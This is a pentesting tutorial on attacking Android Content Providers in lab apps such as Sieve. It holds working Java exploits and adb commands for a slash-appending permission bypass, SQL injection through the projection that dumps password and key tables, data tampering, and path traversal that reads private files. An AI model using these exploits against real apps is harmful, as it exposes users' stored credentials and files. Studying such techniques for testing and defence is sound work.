# Content Provider Hacking

**Overview**

Content Providers manage access to a structured set of data in Android applications. They encapsulate data and provide mechanisms for defining data security. They can be targeted for various vulnerabilities such as SQL Injection and Path-Traversal attacks.

**Key Areas of Focus**

1. **Exported Content Providers**
2. **SQL Injection Vulnerabilities**
3. **Path-Traversal Vulnerabilities**

***

### 1. Exported Content Providers

**What to Look For:**

* **Exported Providers**: Check if the Content Provider is exported in the `AndroidManifest.xml` file. An exported provider can be accessed by other applications.
* **Permissions**: Examine if the Content Provider is protected by permissions. If the `protectionLevel` is not set to `signature`, it might be circumvented.

```xml
<provider
    android:name="com.example.provider"
    android:authorities="com.example.provider"
    android:exported="true"
    android:permission="com.example.provider.READ_WRITE" />
```

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

#### **Code Exploit**&#x20;

```java
Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");
Cursor queryCursor = getContentResolver().query(uri,null,null,null,null);

textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
```

**AndroidManifest.xml** in all exploits should have those lines

```xml
<queries>
    <package android:name="com.apphacking.musicplayer"/>
</queries>
```

#### Case 1: Permission Bypass

Bypassing the custom user permission, because of the missing regex regarding to the PATH

Simply appending `/////` at the end of our content URI will bypass it.

**Code Exploit**

```java
Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys/////");
Cursor queryCursor = getContentResolver().query(uri,null,null,null,null);

textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
```

### 2. SQL Injection Vulnerabilities

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Steps to Identify:**

* **Check Query Methods**: Look at the `query` method to see if user inputs are properly sanitized.
* **Identify Tables**: Locate the tables used within the Content Provider by searching for `content://` URIs in the code.

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**Example Code to Identify SQL Injection Points:**

```java
String selection = "SELECT * FROM users WHERE username = ?";
Cursor cursor = db.rawQuery(selection, new String[]{username});
```

Now we need to identify the tables in the Java code. We can look for the keyword “`content://`“.

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

#### **Case 1**

* We need to query the Passwords table to insert our own SQL statement
* SQL statement will be inserted via the projection
* SQL syntax is sth like: `SELECT * FROM Passwords WHERE ....`
* projection --> `SELECT '* FROM Key--;' (ignored .... FROM Passwords WHERE)`

**Exploit**

```java
Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");

String[] projection = new String[] {"* FROM KEY--;"};
Cursor queryCursor = getContentResolver().query(uri,projection,null,null,null);

textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
```

#### Case 2

* Granting the custom permissions of the sieve application to query the Key table.
* consider:
* Define them in the Manifest

```xml
<uses-permission android:label="@string/perm_descr" android:name="com.mwr.example.sieve.READ_KEYS" android:protectionLevel="dangerous"/>
<uses-permission android:label="@string/perm_descr" android:name="com.mwr.example.sieve.WRITE_KEYS" android:protectionLevel="dangerous"/>
```

* We need to ask for them during runtime.&#x20;

```java
String[] permission = new String[] {"com.mwr.example.sieve.READ_KEYS"};
ActivityCompat.requestPermissions(this, permission,9001);

Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys");

String[] projection = new String[] {"*"};
Cursor queryCursor = getContentResolver().query(uri,projection,null,null,null);

textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
```

**Example SQL Injection Attack:**

*   **Extract All Entries**:

    ```bash
    $ content query --uri content://com.example.provider/users --projection "* FROM users--"
    ```
*   **Inserting Data**:

    ```bash
    $ content insert --uri content://com.example.provider/users --bind name:s:admin
    ```
*   **Updating Data**:

    ```bash
    $ content update --uri content://com.example.provider/users --bind name:s:hacker --where "name='admin'"
    ```
*   **Deleting Data**:

    ```bash
    $ content delete --uri content://com.example.provider/users --where "name='admin'"
    ```

### 3. Path-Traversal Vulnerabilities

**Steps to Identify:**

* **Check Exported Providers**: Again, ensure the Content Provider is exported.
* **ParcelFileDescriptor**: Look for `ParcelFileDescriptor openFile` method and ensure the URI input is sanitized.

**Example Path-Traversal Attack:**

*   **Reading Arbitrary Files**:

    ```bash
    $ content read --uri content://com.example.provider/../../../../../../etc/hosts
    ```

#### Code Exploit

```java
public class MainActivity extends AppCompatActivity {

    InputStream inputStream;
    TextView textView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) findViewById(R.id.textView);

        Uri uri = Uri.parse("content://com.apphacking.musicplayer/../../../../../../../data/data/com.apphacking.musicplayer/files/mySecretFile");

        try {
            inputStream = getContentResolver().openInputStream(uri);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }

        InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
        String fileInput = "";

        try {

            while (bufferedReader.ready()) {
                fileInput += bufferedReader.readLine();
                fileInput += "\n";
            }

        } catch (IOException e) {
                e.printStackTrace();
            }

        textView.setText("Accessing mySecretFile: \n" + fileInput);

    }
}
```

#### Summary

When pentesting Content Providers in Android applications, focus on:

* Ensuring Content Providers are not improperly exported.
* Checking for SQL Injection vulnerabilities by examining how inputs are handled in query methods.
* Identifying and exploiting Path-Traversal vulnerabilities by verifying how file URIs are processed.

By thoroughly investigating these areas, you can identify and exploit significant vulnerabilities in Android applications' Content Providers.
